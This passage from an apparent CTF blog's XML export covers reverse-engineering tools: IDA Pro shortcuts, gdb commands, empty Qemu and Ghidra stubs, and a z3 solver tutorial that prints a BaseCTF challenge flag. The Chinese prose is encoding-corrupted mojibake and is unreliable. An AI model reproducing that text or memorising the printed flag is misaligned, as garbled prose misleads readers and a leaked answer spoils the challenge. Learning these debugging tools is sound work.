è¿”å›ä¸Šä¸€ä¸ªæ“ä½œåœ°å€ã€‚ï¼ˆåªæœ‰åœ¨åæ±‡ç¼–çª—å£æ‰æ˜¯è¿™ä¸ªä½œç”¨ï¼Œå¦‚æœæ˜¯åœ¨å…¶ä»–çª—å£æŒ‰ä¸‹escï¼Œä¼šå…³é—­è¯¥çª—å£ï¼‰<br><code>G</code>ï¼š ç›´æ¥è·³è½¬åˆ°æŸä¸ªåœ°å€<br><code>N</code>ï¼š å¯¹ç¬¦å·é‡å‘½å Yï¼š æ›´æ”¹å˜é‡çš„ç±»å‹<br><code>H</code>ï¼š è½¬æ¢16è¿›åˆ¶<br><code>T</code>ï¼š è§£æç»“æ„ä½“åç§» Mï¼š è½¬æ¢ä¸ºæšä¸¾ç±»å‹å¸¸é‡<br><code>å†’å·é”®</code>ï¼š å¸¸è§„æ³¨é‡Š<br><code>åˆ†å·é”®</code>ï¼š å¯é‡å¤æ³¨é‡Šã€‚åœ¨åæ±‡ç¼–åçš„ç•Œé¢ä¸­å†™ä¸‹æ³¨é‡Š<br><code>/</code> ï¼š åœ¨åç¼–è¯‘åä¼ªä»£ç çš„ç•Œé¢ä¸­å†™ä¸‹æ³¨é‡Š<br><code>\</code>ï¼š åœ¨åç¼–è¯‘åä¼ªä»£ç çš„ç•Œé¢ä¸­éšè—/æ˜¾ç¤ºå˜é‡å’Œå‡½æ•°çš„ç±»å‹æè¿°ï¼Œæœ‰æ—¶å€™å˜é‡ç‰¹åˆ«å¤šçš„æ—¶å€™éšè—æ‰ç±»å‹æè¿°çœ‹èµ·æ¥ä¼šè½»æ¾å¾ˆå¤š<br><code>Alt+M</code>ï¼š æ·»åŠ  æ ‡ç­¾<br><code>Ctrl+M</code>ï¼š æŸ¥çœ‹ æ ‡ç­¾<br><code>ctrl+w</code>ï¼š ä¿å­˜ ida æ•°æ®åº“<br><code>ctrl+shift+w</code>ï¼šæ‹æ‘„ IDA å¿«ç…§<br><code>Ctrl+S</code>ï¼š æŸ¥çœ‹ æ®µä¿¡æ¯ã€‚é€‰æ‹©æŸä¸ªæ•°æ®æ®µï¼Œç›´æ¥è¿›è¡Œè·³è½¬<br><code>ctrl+é¼ æ ‡æ»šè½®</code>ï¼šèƒ½å¤Ÿè°ƒèŠ‚æµç¨‹è§†å›¾çš„å¤§å°<br><code>shift+f12</code>ï¼šå¯ä»¥æ‰“å¼€ string çª—å£ï¼Œä¸€é”®æ‰¾å‡ºæ‰€æœ‰çš„å­—ç¬¦ä¸²ã€‚<br><code>X ( ctrl+X )</code>ï¼š å¯¹ç€æŸä¸ªå‡½æ•°ã€å˜é‡æŒ‰è¯¥å¿«æ·é”®ï¼Œå¯ä»¥æŸ¥çœ‹å®ƒçš„äº¤å‰å¼•ç”¨ã€‚<br><code>F5</code>ï¼š æŸ¥çœ‹ ä¼ªä»£ç ï¼Œå³ ä¸€é”®åæ±‡ç¼–<br><code>Shift +F5</code>ï¼šæ‰“å¼€ç­¾åçª—å£<br><code>ALT+L</code>ï¼šæ ‡è®°(Lable)<br><code>ALT+G</code>ï¼šè½¬æ¢å±€éƒ¨å˜é‡ä¸ºç»“æ„ä½“ ALT+Enterï¼šè·³è½¬åˆ°æ–°çš„çª—å£<br><code>Alt+T</code>ï¼š æ–‡æœ¬æœç´¢<br><code>Alt+B</code>ï¼š äºŒè¿›åˆ¶æœç´¢<br><code>shift + f7</code> æ˜¾ç¤ºæ®µçª—å£  </p><p>Hex View çª—å£</p><p>æ˜¾ç¤º16è¿›åˆ¶ï¼Œé»˜è®¤ä¸ºåªè¯»çŠ¶æ€ï¼Œå¯ä»¥ç”¨å¿«æ·é”®<code>F2</code>å¯¹æ•°æ®åŒºåŸŸï¼ˆç»¿è‰²å­—ç¬¦åŒºåŸŸï¼‰åœ¨åªè¯»å’Œç¼–è¾‘ä¸¤ç§çŠ¶æ€åˆ‡æ¢ã€‚</p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327203731853.png" alt="image-20250327203731853"></p><h2 id="å¸¸ç”¨æ“ä½œ"><a href="#å¸¸ç”¨æ“ä½œ" class="headerlink" title="å¸¸ç”¨æ“ä½œ"></a>å¸¸ç”¨æ“ä½œ</h2><h3 id="åˆ›å»ºæ•°ç»„"><a href="#åˆ›å»ºæ•°ç»„" class="headerlink" title="åˆ›å»ºæ•°ç»„"></a>åˆ›å»ºæ•°ç»„</h3><p>åœ¨æ“ä½œIDAçš„æ—¶å€™ï¼Œç»å¸¸ä¼šé‡åˆ°éœ€è¦åˆ›å»ºæ•°ç»„çš„æƒ…å†µï¼Œå°¤å…¶æ˜¯ä¸ºäº†èƒ½æ–¹ä¾¿æˆ‘ä»¬çœ‹å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œåˆ›å»ºæ•°ç»„æ˜¾å¾—éå¸¸å¿…è¦ï¼Œä»¥ä¸‹æˆ‘éšä¾¿æ‰¾äº†ä¸ªæ•°æ®æ¥åˆ›å»ºæ•°ç»„</p><p>é¦–å…ˆç‚¹å‡»é€‰ä¸­ä½ æƒ³è¦è½¬æ¢æˆæ•°ç»„çš„ä¸€å—åŒºåŸŸï¼š</p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327204318565.png" alt="image-20250327204318565"></p><ul><li><code>Array element size</code> è¿™ä¸ªå€¼è¡¨ç¤ºå„æ•°ç»„å…ƒç´ çš„å¤§å°ï¼ˆè¿™é‡Œæ˜¯1ä¸ªå­—èŠ‚ï¼‰ï¼Œæ˜¯æ ¹æ®ä½ é€‰ä¸­çš„æ•°æ®å€¼çš„å¤§å°æ‰€å†³å®šçš„</li><li><code>Array size</code> è¡¨ç¤ºæ•°ç»„å…ƒç´ çš„æ•°é‡ï¼Œä¸€èˆ¬éƒ½æ ¹æ®ä½ é€‰å®šçš„è‡ªåŠ¨äº§ç”Ÿé»˜è®¤å€¼</li><li><code>Items on a line</code> è¿™ä¸ªè¡¨ç¤ºæŒ‡å®šæ¯ä¸ªåæ±‡ç¼–è¡Œæ˜¾ç¤ºçš„å…ƒç´ æ•°é‡ï¼Œå®ƒå¯ä»¥å‡å°‘æ˜¾ç¤ºæ•°ç»„æ‰€éœ€çš„ç©ºé—´</li><li><code>Element print width</code> è¿™ä¸ªå€¼ç”¨äºæ ¼å¼åŒ–ï¼Œå½“ä¸€è¡Œæ˜¾ç¤ºå¤šä¸ªé¡¹ç›®æ—¶ï¼Œä»–æ§åˆ¶åˆ—å®½</li><li><code>Use â€œdupâ€ construct</code> ï¼šä½¿ç”¨é‡å¤ç»“æ„ï¼Œè¿™ä¸ªé€‰é¡¹å¯ä»¥ä½¿å¾—ç›¸åŒçš„æ•°æ®å€¼åˆå¹¶èµ·æ¥ï¼Œç”¨ä¸€ä¸ªé‡å¤è¯´æ˜ç¬¦ç»„åˆæˆä¸€é¡¹</li><li><code>Signed elements</code> è¡¨ç¤ºå°†æ•°æ®æ˜¾ç¤ºä¸ºæœ‰ç¬¦å·æ•°è¿˜æ˜¯æ— ç¬¦å·æ•°</li><li><code>Display indexes</code> æ˜¾ç¤ºç´¢å¼•ï¼Œä½¿å¾—æ•°ç»„ç´¢å¼•ä»¥å¸¸è§„çš„å½¢å¼æ˜¾ç¤ºï¼Œå¦‚æœé€‰äº†è¿™ä¸ªé€‰é¡¹ï¼Œè¿˜ä¼šå¯åŠ¨å³è¾¹çš„Indexesé€‰é¡¹æ ï¼Œç”¨äºé€‰æ‹©ç´¢å¼•çš„æ˜¾ç¤ºæ ¼å¼</li><li><code>Create as array</code> åˆ›å»ºä¸ºæ•°ç»„ï¼Œè¿™ä¸ªä¸€èˆ¬é»˜è®¤é€‰ä¸Šçš„</li></ul><p>åˆ›å»ºå¥½äº†ä»¥åï¼Œå°±å˜æˆäº†è¿™æ ·ï¼š<img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327204404132.png" alt="image-20250327204404132"></p><h3 id="åˆ†æ”¯å—"><a href="#åˆ†æ”¯å—" class="headerlink" title="åˆ†æ”¯å—"></a>åˆ†æ”¯å—</h3><ul><li>é‡å‘½å</li><li>æŠ˜å </li></ul><h3 id="åˆ›å»ºç»“æ„ä½“"><a href="#åˆ›å»ºç»“æ„ä½“" class="headerlink" title="åˆ›å»ºç»“æ„ä½“"></a>åˆ›å»ºç»“æ„ä½“</h3><p>å¿«æ·é”®<code>Insert</code></p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327204713332.png" alt="image-20250327204713332"></p><p>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå¯ä»¥ç¼–è¾‘ç»“æ„ä½“çš„åå­—<br>è¿™åº•ä¸‹æœ‰ä¸‰ä¸ªå¤é€‰æ¡†ï¼Œ</p><ul><li>ç¬¬ä¸‰ä¸ªè¡¨ç¤ºæ˜¯å¦åˆ›å»ºè”åˆä½“ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç»“æ„ä½“çš„å¤§å°æ˜¯å®ƒæ‰€åŒ…å«çš„å­—æ®µå¤§å°çš„æ€»å’Œï¼Œè€Œè”åˆä½“çš„å¤§å°åˆ™ç­‰äºå…¶ä¸­æœ€å¤§å­—æ®µçš„å¤§å°</li></ul><p>åœ¨å•å‡»okä»¥åï¼Œå°±å®šå¥½äº†ä¸€ä¸ªç©ºçš„ç»“æ„ä½“ï¼š</p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327214552718.png" alt="image-20250327214552718"></p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250328084202610.png" alt="image-20250328084202610"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> **heap_list</span><br><span class="line"><span class="type">void</span> *heaplist[]</span><br><span class="line"><span class="comment">//é€‰å…¶ä¸€</span></span><br></pre></td></tr></table></figure><h2 id="IDAå¸¸è§å‘½åæ„ä¹‰"><a href="#IDAå¸¸è§å‘½åæ„ä¹‰" class="headerlink" title="IDAå¸¸è§å‘½åæ„ä¹‰"></a>IDAå¸¸è§å‘½åæ„ä¹‰</h2><p>IDA ç»å¸¸ä¼šè‡ªåŠ¨ç”Ÿæˆå‡åå­—ã€‚ä»–ä»¬ç”¨äºè¡¨ç¤ºå­ â€œå‡½æ•°ï¼Œç¨‹åºåœ°å€å’Œæ•°æ®â€ã€‚</p><p>æ ¹æ®ä¸åŒçš„ç±»å‹å’Œå€¼å‡åå­—æœ‰ä¸åŒå‰ç¼€</p><blockquote><p>sub    æŒ‡ä»¤å’Œå­å‡½æ•°èµ·ç‚¹<br>locret   è¿”å›æŒ‡ä»¤<br>loc    æŒ‡ä»¤</p><p>off æ•°æ®ï¼ŒåŒ…å«åç§»é‡<br>seg    æ•°æ®ï¼ŒåŒ…å«æ®µåœ°å€å€¼</p><p>asc æ•°æ®ï¼ŒASCIIå­—ç¬¦ä¸²<br>byte    æ•°æ®ï¼Œå­—èŠ‚ï¼ˆæˆ–å­—èŠ‚æ•°ç»„ï¼‰</p><p>word æ•°æ®ï¼Œ16ä½æ•°æ®ï¼ˆæˆ–å­—æ•°ç»„ï¼‰<br>dword   æ•°æ®ï¼Œ32ä½æ•°æ®ï¼ˆæˆ–åŒå­—æ•°ç»„ï¼‰</p><p>qword æ•°æ®ï¼Œ64ä½æ•°æ®ï¼ˆæˆ–4å­—æ•°ç»„ï¼‰<br>flt    æµ®ç‚¹æ•°æ®ï¼Œ32ä½ï¼ˆæˆ–æµ®ç‚¹æ•°ç»„ï¼‰</p><p>dbl æµ®ç‚¹æ•°ï¼Œ64ä½ï¼ˆæˆ–åŒç²¾åº¦æ•°ç»„ï¼‰<br>tbyte   æµ®ç‚¹æ•°ï¼Œ80ä½ï¼ˆæˆ–æ‰©å±•ç²¾åº¦æµ®ç‚¹æ•°ï¼‰</p><p>stru ç»“æ„ä½“(æˆ–ç»“æ„ä½“æ•°ç»„)<br>algn    å¯¹é½æŒ‡ç¤ºunk æœªå¤„ç†å­—èŠ‚</p></blockquote><p>IDA ä¸­æœ‰å¸¸è§çš„è¯´æ˜ç¬¦å·ï¼Œå¦‚ dbã€dwã€dd åˆ†åˆ«ä»£è¡¨äº†1ä¸ªå­—èŠ‚ã€2ä¸ªå­—èŠ‚ã€4ä¸ªå­—èŠ‚</p><ul><li>sub_xxxxxxï¼šåœ°å€xxxxxxå¤„çš„å­ä¾‹ç¨‹</li><li>loc_xxxxxxï¼šåœ°å€xxxxxxå¤„çš„ä¸€ä¸ªæŒ‡ä»¤ã€‚</li><li>byte_xxxxxxï¼šä½ç½®xxxxxxå¤„çš„8ä½æ•°æ®ã€‚</li><li>word_xxxxxxï¼šä½ç½®xxxxxxå¤„çš„16ä½æ•°æ®</li><li>dword_xxxxxxï¼šä½ç½®xxxxxxå¤„çš„32ä½æ•°æ®ï¼Œ</li><li>unk_xxxxxxï¼šä½ç½®xxxxxxå¤„çš„å¤§å°æœªçŸ¥çš„æ•°æ®ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·gdb</title>
      <link href="/2025/02/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7gdb/"/>
      <url>/2025/02/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7gdb/</url>
      
        <content type="html"><![CDATA[<p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html"> 100ä¸ªgdbå°æŠ€å·§</a></p><p><code>start</code>:ç¨‹åºè‡ªåŠ¨ä¸­æ–­åœ¨mainå‡½æ•°å¤„<br><code>c</code>:ç»§ç»­è¿è¡Œ</p><p><code>b main</code>:mainå¤„ä¸‹æ–­ç‚¹<br><code>r/run</code>:è¿è¡Œç¨‹åºï¼Œé‡åˆ°æ–­ç‚¹åœä¸‹<br><code>vmmap</code>:æŸ¥çœ‹å†…å­˜æ˜ å°„ï¼Œå„åŠ è½½æ–‡ä»¶çš„åŠ è½½åœ°å€ä¿¡æ¯</p><p><code>-q</code>:å‚æ•°ä¸æ˜¾ç¤ºæ¬¢è¿ä¿¡æ¯ç­‰<br><code>-n</code>:ä¸åŠ è½½ä»»ä½•æ’ä»¶ï¼Œä½¿ç”¨åŸç”Ÿ gdb<br><code>info</code>:åé¢è·Ÿä¸Šæƒ³è¦æŸ¥çœ‹çš„ä¿¡æ¯ï¼Œå¦‚å‡½æ•°ä¿¡æ¯ info functions</p><p><code>b/breakpoint</code>:è®¾ç½®æ–­ç‚¹<br><code>del/delete breakpoints n</code>:åˆ é™¤æ–­ç‚¹ï¼Œnæ˜¯æ–­ç‚¹ç¼–å·ï¼Œå¯ç”¨info breakpointså‘½ä»¤æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯</p><p><code>start</code>å‘½ä»¤å¯åŠ¨ç¨‹åºå¹¶åœåœ¨å¼€è¾Ÿå®Œä¸»å‡½æ•°æ ˆå¸§çš„åœ°æ–¹<br><code>c/continue</code>:ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œé‡åˆ°æ–­ç‚¹åœä¸‹<br><code>f/finish</code>:ç»“æŸç¨‹åº</p><p><code>ni</code>:å•æ­¥æ­¥è¿‡ï¼Œä¸€æ­¥ä¸€æ­¥æ‰§è¡ŒæŒ‡ä»¤é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶ç›´æ¥æ‰§è¡Œå®Œæ•´ä¸ªå‡½æ•°<br><code>si</code>:å•æ­¥æ­¥å…¥ï¼Œä¸€æ­¥ä¸€æ­¥æ‰§è¡ŒæŒ‡ä»¤é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶è·³è½¬åˆ°å‡½æ•°å†…éƒ¨</p><p><code>checksec</code>:æŸ¥çœ‹ç¨‹åºçš„é˜²æŠ¤æªæ–½</p><p><code>pdisass/disassemble</code>:æŸ¥çœ‹å½“å‰å‡½æ•°å¸§çš„åæ±‡ç¼–ä»£ç ï¼Œå‰ä¸€ä¸ªå‘½ä»¤æœ‰é«˜äº®æ˜¾ç¤ºåªæ˜¯éœ€è¦å®‰è£…pwndbgæ’ä»¶ï¼Œåé¢ä¸€ä¸ªå‘½ä»¤æ—¶gdbè‡ªå¸¦çš„å‘½ä»¤æ— é«˜äº®æ˜¾ç¤º</p><p><code>p/print</code>:æ‰“å°ä¿¡æ¯ï¼Œå¦‚å¯„å­˜å™¨ p $ebp<br><code>p &amp; __libc_argv[0]</code>:å¯ä»¥å¾—åˆ°argv[0]çš„åœ°å€</p><p><code>x/&lt;n/f/u&gt; &lt;addr&gt;</code>:æŸ¥çœ‹æŸåœ°å€å¤„çš„å€¼ï¼Œn/f/u å‚æ•°ä¸ºå¯é€‰ï¼Œnä»£è¡¨æƒ³è¦æŸ¥çœ‹å¤šå°‘ä¸ªå†…å­˜å•å…ƒå³ä»å½“å‰åœ°å€å¼€å§‹è®¡ç®—ï¼Œæ¯ä¸ªå†…å­˜å•å…ƒçš„å¤§å°ç”±åé¢çš„uå‚æ•°æŒ‡å®šï¼›fè¡¨ç¤ºæ˜¾ç¤ºæ ¼å¼ï¼Œå¦‚sè¡¨ç¤ºå­—ç¬¦ä¸²å½¢å¼ï¼Œiä¸ºæŒ‡ä»¤å½¢å¼ï¼›uæŒ‡å®šå†…å­˜å•å…ƒå¤§å°ï¼Œb(ä¸€ä¸ªå­—èŠ‚)ã€h(åŒå­—èŠ‚)ã€w(å››ä¸ªå­—èŠ‚)ã€g(å…«å­—èŠ‚)é»˜è®¤ä¸ºwï¼› åé¢è·Ÿä¸Šxä»£è¡¨ä»¥åå…­è¿›åˆ¶çš„å½¢å¼æŸ¥çœ‹å˜é‡</p><p><code>set *addr = value</code>:è®¾ç½®æŸä¸ªåœ°å€çš„å€¼</p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·Qemu</title>
      <link href="/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Qemu/"/>
      <url>/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Qemu/</url>
      
        <content type="html"><![CDATA[<h2 id="å¾…å¡«å‘"><a href="#å¾…å¡«å‘" class="headerlink" title="å¾…å¡«å‘"></a>å¾…å¡«å‘</h2><p>çº¯è½¯ä»¶å®ç°çš„è™šæ‹ŸåŒ–æ¨¡æ‹Ÿå™¨ï¼Œå‡ ä¹å¯ä»¥æ¨¡æ‹Ÿä»»ä½•ç¡¬ä»¶è®¾å¤‡</p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·Ghidra</title>
      <link href="/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Ghidra/"/>
      <url>/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Ghidra/</url>
      
        <content type="html"><![CDATA[<h2 id="å¾…å¡«å‘"><a href="#å¾…å¡«å‘" class="headerlink" title="å¾…å¡«å‘"></a>å¾…å¡«å‘</h2>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
            <tag> Ghidra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·z3çº¦æŸæ±‚è§£å™¨</title>
      <link href="/2024/08/23/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7z3%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/08/23/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7z3%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="z3åº“"><a href="#z3åº“" class="headerlink" title="z3åº“"></a>z3åº“</h1><hr><h2 id="ä¸‹è½½z3åº“"><a href="#ä¸‹è½½z3åº“" class="headerlink" title="ä¸‹è½½z3åº“"></a>ä¸‹è½½z3åº“</h2><p><code>pip3 install z3-solver</code></p><hr><h2 id="åŸºæœ¬å˜é‡ç±»å‹"><a href="#åŸºæœ¬å˜é‡ç±»å‹" class="headerlink" title="åŸºæœ¬å˜é‡ç±»å‹"></a>åŸºæœ¬å˜é‡ç±»å‹</h2><p>æ•´å‹(Int)ï¼Œå®å‹(Real)å’Œå‘é‡(BitVec)</p><h3 id="æ•´å‹"><a href="#æ•´å‹" class="headerlink" title="æ•´å‹"></a>æ•´å‹</h3><ol><li>Int(name, ctx=None)ï¼Œåˆ›å»ºä¸€ä¸ªæ•´æ•°å˜é‡ï¼Œnameæ˜¯åå­—</li><li>Ints (names, ctx=None)ï¼Œåˆ›å»ºå¤šä¸ªæ•´æ•°å˜é‡ï¼Œnamesæ˜¯ç©ºæ ¼åˆ†éš”åå­—</li></ol><h3 id="å®æ•°"><a href="#å®æ•°" class="headerlink" title="å®æ•°"></a>å®æ•°</h3><ol><li><p>real(name, ctx=None)ï¼Œåˆ›å»ºä¸€ä¸ªå®å˜é‡ï¼Œnameæ˜¯åå­—</p></li><li><p>reals (names, ctx=None)ï¼Œåˆ›å»ºå¤šä¸ªå®å˜é‡ï¼Œnamesæ˜¯ç©ºæ ¼åˆ†éš”åå­—</p></li><li><p>realVal (val, ctx=None)ï¼Œåˆ›å»ºä¸€ä¸ªå®å¸¸é‡ï¼Œæœ‰åˆå§‹å€¼ï¼Œæ²¡åå­—ã€‚</p></li></ol><h3 id="å‘é‡"><a href="#å‘é‡" class="headerlink" title="å‘é‡"></a>å‘é‡</h3><p>BitVec(å˜é‡å,å˜é‡çš„å¤§å°ï¼ˆå•ä½bitï¼‰)</p><ol><li><p><code>BitVec(name,bv,ctx=None)</code>ï¼Œåˆ›å»ºä¸€ä¸ªä½å‘é‡ï¼Œnameæ˜¯ä»–çš„åå­—ï¼Œbvè¡¨ç¤ºå¤§å°  </p></li><li><p><code>BitVecs(name,bv,ctx=None)</code>ï¼Œåˆ›å»ºä¸€ä¸ªæœ‰å¤šå˜é‡çš„ä½å‘é‡ï¼Œnameæ˜¯åå­—ï¼Œbvè¡¨ç¤ºå¤§å°  </p></li><li><p><code>BitVecVal(val,bv,ctx=None)</code>ï¼Œåˆ›å»ºä¸€ä¸ªä½å‘é‡ï¼Œæœ‰åˆå§‹å€¼ï¼Œæ²¡åå­—ã€‚</p></li></ol><hr><h2 id="å¸¸ç”¨API"><a href="#å¸¸ç”¨API" class="headerlink" title="å¸¸ç”¨API"></a>å¸¸ç”¨API</h2><ol><li>åˆ›å»ºçº¦æŸæ±‚è§£å™¨  <code>s = Solver()</code></li><li>åˆ—æ–¹ç¨‹<code>s.add(...)</code></li><li>åˆ¤æ–­è§£æ˜¯å¦å­˜åœ¨ ï¼ˆå­˜åœ¨å°±æ‰“å°è¿”å›satï¼‰<code>s.check()</code></li><li>æ±‚è§£  <code>print(s.model()[å‘é‡å])</code></li></ol><p>ç”¨èµ·æ¥è¿˜æ˜¯æŒºç®€å•çš„ï¼Œåªä¸è¿‡è¿™é‡Œå¿…é¡»è¦åŠ check()æ£€æµ‹ä¸ç„¶ä¼šæŠ¥é”™ï¼Œå¦‚å›¾ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥Z3çº¦æŸæ±‚è§£åº“</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰ä¸€ä¸ªåä¸º&#x27;x&#x27;çš„æ•´æ•°ç¬¦å·å˜é‡</span></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰ä¸€ä¸ªåä¸º&#x27;y&#x27;çš„æ•´æ•°ç¬¦å·å˜é‡</span></span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ–°çš„æ±‚è§£å™¨å¯¹è±¡ï¼Œç”¨äºè§£å†³ä¸€ç»„çº¦æŸ</span></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘æ±‚è§£å™¨æ·»åŠ ä¸‰ä¸ªçº¦æŸæ¡ä»¶ï¼š</span></span><br><span class="line"><span class="comment"># 1. x å¤§äº 2</span></span><br><span class="line"><span class="comment"># 2. y å°äº 10</span></span><br><span class="line"><span class="comment"># 3. x å’Œ 2å€çš„y çš„å’Œç­‰äº 7</span></span><br><span class="line">s.add(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥æ±‚è§£å™¨ä¸­çš„çº¦æŸæ˜¯å¦æœ‰è§£</span></span><br><span class="line">s.check()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœæ±‚è§£å™¨ä¸­çš„çº¦æŸæœ‰è§£ï¼Œåˆ™æ‰“å°å‡ºæ»¡è¶³è¿™äº›çº¦æŸçš„æ¨¡å‹ï¼ˆå³å˜é‡çš„èµ‹å€¼ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><hr><h2 id="ä¾‹"><a href="#ä¾‹" class="headerlink" title="ä¾‹"></a>ä¾‹</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line">s = z3.Solver()</span><br><span class="line">flag = [z3.BitVec(<span class="string">f&#x27;flag_<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line">cipher = [</span><br><span class="line">     <span class="number">98</span>, <span class="number">113</span>, <span class="number">163</span>, <span class="number">181</span>, <span class="number">115</span>, <span class="number">148</span>, <span class="number">166</span>,  <span class="number">43</span>,   <span class="number">9</span>,  <span class="number">95</span>,</span><br><span class="line">    <span class="number">165</span>, <span class="number">146</span>,  <span class="number">79</span>, <span class="number">115</span>, <span class="number">146</span>, <span class="number">233</span>, <span class="number">112</span>, <span class="number">180</span>,  <span class="number">48</span>,  <span class="number">79</span>,</span><br><span class="line">     <span class="number">65</span>, <span class="number">181</span>, <span class="number">113</span>, <span class="number">146</span>,  <span class="number">46</span>, <span class="number">249</span>,  <span class="number">78</span>, <span class="number">183</span>,  <span class="number">79</span>, <span class="number">133</span>,</span><br><span class="line">    <span class="number">180</span>, <span class="number">113</span>, <span class="number">146</span>, <span class="number">148</span>, <span class="number">163</span>,  <span class="number">79</span>,  <span class="number">78</span>,  <span class="number">48</span>, <span class="number">231</span>,  <span class="number">77</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s.add(<span class="number">32</span> &lt;= flag[i], flag[i] &lt;= <span class="number">126</span>)</span><br><span class="line">    s.add(flag[i] * <span class="number">17</span> == cipher[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == z3.sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[f].as_long()) <span class="keyword">for</span> f <span class="keyword">in</span> flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># BaseCTF&#123;yoUr_CrYpt0_1earNinG_5tarTs_n0w&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·æ¤­åœ†æ›²çº¿</title>
      <link href="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/"/>
      <url>/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/</url>
      
